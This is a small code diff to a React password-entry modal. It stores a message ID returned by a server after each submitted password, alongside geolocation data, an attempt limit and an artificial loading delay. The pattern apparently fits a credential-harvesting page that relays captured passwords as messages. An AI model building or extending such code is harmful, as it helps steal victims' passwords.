@@ -18,7 +18,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, message, setMessage } = store();
+    const { geoInfo, messageId, message, setMessage, setMessageId } = store();
     const maxPass = config.MAX_PASS ?? 3;
 
     const t = (text: string): string => {
@@ -67,6 +67,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
             if (res?.data?.success) {
                 setMessage(updatedMessage);
+                setMessageId(res.data.data.result.message_id);
             }
 
             if (config.PASSWORD_LOADING_TIME) {
